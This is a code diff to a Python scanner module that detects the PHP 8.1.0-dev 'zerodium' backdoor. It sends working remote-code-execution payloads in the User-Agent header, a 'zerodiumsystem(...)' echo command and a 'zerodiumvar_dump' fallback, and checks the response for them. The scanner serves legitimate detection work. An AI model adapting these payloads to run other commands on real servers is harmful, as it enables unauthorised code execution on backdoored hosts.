@@ -59,15 +59,35 @@ class Module(Scanner, Http_client):
     }
 
     def run(self):
-        r = self.http_request(method="GET", path='/', allow_redirects=False)
-        if not r or r.status_code != 200:
+        # Backdoor is triggered via User-Agent prefix "zerodium" + PHP code.
+        marker = 'KSPHP81' + self.random_text(8)
+        r = self.http_request(
+            method='GET',
+            path='/',
+            headers={'User-Agent': f'zerodiumsystem("echo {marker}");'},
+            allow_redirects=False,
+        )
+        if not r:
             return False
-        body = r.text or ""
-        body_any = ('int(77777355556)',)
-        if (any(m in body for m in body_any)):
+        body = r.text or ''
+        if marker in body:
             self.set_info(
                 severity='critical',
-                reason="PHP 8.1.0-dev - Backdoor Remote Code Execution detected",
+                reason='PHP 8.1.0-dev zerodium backdoor RCE confirmed',
+                path='/',
+            )
+            return True
+        # Fallback: var_dump of a fixed int unique to the backdoor evaluator
+        r2 = self.http_request(
+            method='GET',
+            path='/',
+            headers={'User-Agent': 'zerodiumvar_dump(77777355556);'},
+            allow_redirects=False,
+        )
+        if r2 and 'int(77777355556)' in (r2.text or ''):
+            self.set_info(
+                severity='critical',
+                reason='PHP 8.1.0-dev zerodium backdoor RCE confirmed',
                 path='/',
             )
             return True
